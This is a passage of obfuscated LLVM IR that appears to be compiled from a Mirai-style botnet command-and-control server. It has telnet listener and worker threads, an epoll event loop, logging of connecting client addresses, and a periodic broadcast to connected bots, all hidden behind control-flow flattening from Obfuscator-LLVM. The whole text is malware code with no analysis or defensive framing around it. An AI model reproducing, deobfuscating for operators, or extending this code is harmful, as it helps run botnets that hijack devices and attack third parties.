  store i16 %23, i16* %24, align 2
  %25 = load i32, i32* %4, align 4
  %26 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %27 = call i32 @bind(i32 %25, %struct.sockaddr* %26, i32 16) #7
  %28 = icmp slt i32 %27, 0
  %29 = select i1 %28, i32 1126129078, i32 -2091563579
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.95, i32 0, i32 0))
  store i32 -2091563579, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i32, i32* %4, align 4
  %33 = call i32 @listen(i32 %32, i32 5) #7
  store i32 16, i32* %6, align 4
  store i32 941612665, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.96, i32 0, i32 0))
  %36 = bitcast %struct.sockaddr_in* %8 to { i64, i64 }*
  %37 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %36, i32 0, i32 0
  %38 = load i64, i64* %37, align 4
  %39 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %36, i32 0, i32 1
  %40 = load i64, i64* %39, align 4
  call void @client_addr(i64 %38, i64 %40)
  %41 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %41, %struct._IO_FILE** %9, align 8
  %42 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %44 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %43, i32 0, i32 0
  %45 = load i32, i32* %44, align 4
  %46 = and i32 %45, 255
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %48 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %47, i32 0, i32 0
  %49 = load i32, i32* %48, align 4
  %50 = and i32 %49, 65280
  %51 = lshr i32 %50, 8
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %53 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %52, i32 0, i32 0
  %54 = load i32, i32* %53, align 4
  %55 = and i32 %54, 16711680
  %56 = lshr i32 %55, 16
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %58 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %57, i32 0, i32 0
  %59 = load i32, i32* %58, align 4
  %60 = and i32 %59, -16777216
  %61 = lshr i32 %60, 24
  %62 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %42, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.97, i32 0, i32 0), i32 %46, i32 %51, i32 %56, i32 %61)
  %63 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %64 = call i32 @fclose(%struct._IO_FILE* %63)
  %65 = load i32, i32* %4, align 4
  %66 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %67 = call i32 @accept(i32 %65, %struct.sockaddr* %66, i32* %6)
  store i32 %67, i32* %5, align 4
  %68 = load i32, i32* %5, align 4
  %69 = icmp slt i32 %68, 0
  %70 = select i1 %69, i32 569110776, i32 -387266935
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.98, i32 0, i32 0))
  store i32 -387266935, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %5, align 4
  %74 = sext i32 %73 to i64
  %75 = inttoptr i64 %74 to i8*
  %76 = call i32 @pthread_create(i64* %10, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %75) #7
  store i32 941612665, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i8*, i8** %2, align 8
  ret i8* %78

loopEnd:                                          ; preds = %72, %71, %34, %31, %30, %16, %15, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #3

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #4

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**, i8**) #0 {
  %.reg2mem2 = alloca i64*
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca [20 x i8], align 16
  %13 = alloca [20 x i8], align 16
  %14 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %15 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %16 = load i32, i32* %5, align 4
  store i32 %16, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1933832190, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1933832190, label %first
    i32 1001492286, label %19
    i32 -717732651, label %25
    i32 -995175495, label %39
    i32 589026355, label %41
    i32 690829172, label %51
    i32 -2040562685, label %52
    i32 166688139, label %58
    i32 1161771705, label %59
    i32 1552330175, label %65
    i32 -1580127835, label %66
    i32 -72746613, label %71
    i32 -1849888590, label %72
    i32 1816803074, label %83
    i32 1474377417, label %84
    i32 1662753014, label %90
    i32 -590409300, label %95
    i32 -1132064055, label %101
    i32 -1339992163, label %107
    i32 1690184205, label %108
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %17 = icmp ne i32 %.reload, 4
  %18 = select i1 %17, i32 1001492286, i32 -717732651
  store i32 %18, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %21 = load i8**, i8*** %6, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %20, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.99, i32 0, i32 0), i8* %23)
  call void @exit(i32 1) #10
  unreachable

; <label>:25:                                     ; preds = %loopEntry
  %26 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i32 0, i32 0))
  store %struct._IO_FILE* %26, %struct._IO_FILE** @fileFD, align 8
  %27 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i32 0, i32 0))
  store %struct._IO_FILE* %27, %struct._IO_FILE** @kfileFD, align 8
  %28 = load i8**, i8*** %6, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 3
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30) #8
  store i32 %31, i32* %10, align 4
  %32 = load i8**, i8*** %6, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 2
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @atoi(i8* %34) #8
  store i32 %35, i32* %9, align 4
  %36 = load i32, i32* %9, align 4
  %37 = icmp sgt i32 %36, 850
  %38 = select i1 %37, i32 -995175495, i32 589026355
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.103, i32 0, i32 0))
  ret i32 0

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %10, align 4
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.104, i32 0, i32 0), i32 %42)
  %44 = load i8**, i8*** %6, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 1
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @create_and_bind(i8* %46)
  store volatile i32 %47, i32* @listenFD, align 4
  %48 = load volatile i32, i32* @listenFD, align 4
  %49 = icmp eq i32 %48, -1
  %50 = select i1 %49, i32 690829172, i32 -2040562685
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  call void @abort() #10
  unreachable

; <label>:52:                                     ; preds = %loopEntry
  %53 = load volatile i32, i32* @listenFD, align 4
  %54 = call i32 @make_socket_non_blocking(i32 %53)
  store i32 %54, i32* %8, align 4
  %55 = load i32, i32* %8, align 4
  %56 = icmp eq i32 %55, -1
  %57 = select i1 %56, i32 166688139, i32 1161771705
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  call void @abort() #10
  unreachable

; <label>:59:                                     ; preds = %loopEntry
  %60 = load volatile i32, i32* @listenFD, align 4
  %61 = call i32 @listen(i32 %60, i32 128) #7
  store i32 %61, i32* %8, align 4
  %62 = load i32, i32* %8, align 4
  %63 = icmp eq i32 %62, -1
  %64 = select i1 %63, i32 1552330175, i32 -1580127835
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.105, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:66:                                     ; preds = %loopEntry
  %67 = call i32 @epoll_create1(i32 0) #7
  store volatile i32 %67, i32* @epollFD, align 4
  %68 = load volatile i32, i32* @epollFD, align 4
  %69 = icmp eq i32 %68, -1
  %70 = select i1 %69, i32 -72746613, i32 -1849888590
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.106, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:72:                                     ; preds = %loopEntry
  %73 = load volatile i32, i32* @listenFD, align 4
  %74 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %75 = bitcast %union.epoll_data* %74 to i32*
  store i32 %73, i32* %75, align 1
  %76 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %76, align 1
  %77 = load volatile i32, i32* @epollFD, align 4
  %78 = load volatile i32, i32* @listenFD, align 4
  %79 = call i32 @epoll_ctl(i32 %77, i32 1, i32 %78, %struct.epoll_event* %11) #7
  store i32 %79, i32* %8, align 4
  %80 = load i32, i32* %8, align 4
  %81 = icmp eq i32 %80, -1
  %82 = select i1 %81, i32 1816803074, i32 1474377417
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %9, align 4
  %86 = add nsw i32 %85, 2
  %87 = zext i32 %86 to i64
  %88 = call i8* @llvm.stacksave()
  store i8* %88, i8** %14, align 8
  %89 = alloca i64, i64 %87, align 16
  store i64* %89, i64** %.reg2mem2
  store i32 1662753014, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %9, align 4
  %92 = add nsw i32 %91, -1
  store i32 %92, i32* %9, align 4
  %93 = icmp ne i32 %91, 0
  %94 = select i1 %93, i32 -590409300, i32 -1132064055
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = load i32, i32* %9, align 4
  %97 = add nsw i32 %96, 1
  %98 = sext i32 %97 to i64
  %.reload4 = load volatile i64*, i64** %.reg2mem2
  %99 = getelementptr inbounds i64, i64* %.reload4, i64 %98
  %100 = call i32 @pthread_create(i64* %99, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #7
  store i32 1662753014, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %.reload3 = load volatile i64*, i64** %.reg2mem2
  %102 = getelementptr inbounds i64, i64* %.reload3, i64 0
  %103 = load i32, i32* %10, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  %106 = call i32 @pthread_create(i64* %102, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %105) #7
  store i32 -1339992163, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 1690184205, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i32 -1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.107, i32 0, i32 0))
  %109 = call i32 @sleep(i32 60)
  store i32 -1339992163, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %108, %107, %101, %95, %90, %84, %72, %66, %59, %52, %41, %25, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: noinline nounwind uwtable
define internal i32 @create_and_bind(i8*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 48, i32 8, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  store i32 %16, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -134887740, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -134887740, label %first
    i32 -483326015, label %19
    i32 -1751584524, label %24
    i32 -1440457163, label %26
    i32 1833606105, label %30
    i32 -521455288, label %44
    i32 845499606, label %45
    i32 1107781691, label %51
    i32 -923902554, label %52
    i32 1344521303, label %64
    i32 753174702, label %65
    i32 -81732127, label %68
    i32 -329751813, label %72
    i32 -2146538299, label %76
    i32 -732323543, label %79
    i32 -935870298, label %82
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %17 = icmp ne i32 %.reload, 0
  %18 = select i1 %17, i32 -483326015, i32 -1751584524
  store i32 %18, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %21 = load i32, i32* %7, align 4
  %22 = call i8* @gai_strerror(i32 %21) #7
  %23 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %20, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.109, i32 0, i32 0), i8* %22)
  store i32 -1, i32* %2, align 4
  store i32 -935870298, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %25, %struct.addrinfo** %6, align 8
  store i32 -1440457163, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %28 = icmp ne %struct.addrinfo* %27, null
  %29 = select i1 %28, i32 1833606105, i32 -329751813
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %32 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %31, i32 0, i32 1
  %33 = load i32, i32* %32, align 4
  %34 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %35 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %34, i32 0, i32 2
  %36 = load i32, i32* %35, align 8
  %37 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %38 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %37, i32 0, i32 3
  %39 = load i32, i32* %38, align 4
  %40 = call i32 @socket(i32 %33, i32 %36, i32 %39) #7
  store i32 %40, i32* %8, align 4
  %41 = load i32, i32* %8, align 4
  %42 = icmp eq i32 %41, -1
  %43 = select i1 %42, i32 -521455288, i32 845499606
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 -81732127, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %46 = load i32, i32* %8, align 4
  %47 = bitcast i32* %9 to i8*
  %48 = call i32 @setsockopt(i32 %46, i32 1, i32 2, i8* %47, i32 4) #7
  %49 = icmp eq i32 %48, -1
  %50 = select i1 %49, i32 1107781691, i32 -923902554
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.110, i32 0, i32 0))
  store i32 -923902554, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %8, align 4
  %54 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %55 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %54, i32 0, i32 5
  %56 = load %struct.sockaddr*, %struct.sockaddr** %55, align 8
  %57 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %58 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %57, i32 0, i32 4
  %59 = load i32, i32* %58, align 8
  %60 = call i32 @bind(i32 %53, %struct.sockaddr* %56, i32 %59) #7
  store i32 %60, i32* %7, align 4
  %61 = load i32, i32* %7, align 4
  %62 = icmp eq i32 %61, 0
  %63 = select i1 %62, i32 1344521303, i32 753174702
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 -329751813, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %8, align 4
  %67 = call i32 @close(i32 %66)
  store i32 -81732127, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %70 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %69, i32 0, i32 7
  %71 = load %struct.addrinfo*, %struct.addrinfo** %70, align 8
  store %struct.addrinfo* %71, %struct.addrinfo** %6, align 8
  store i32 -1440457163, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %74 = icmp eq %struct.addrinfo* %73, null
  %75 = select i1 %74, i32 -2146538299, i32 -732323543
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %78 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %77, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.111, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  store i32 -935870298, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %80) #7
  %81 = load i32, i32* %8, align 4
  store i32 %81, i32* %2, align 4
  store i32 -935870298, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %2, align 4
  ret i32 %83

loopEnd:                                          ; preds = %79, %76, %72, %68, %65, %64, %52, %51, %45, %44, %30, %26, %24, %19, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readonly }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
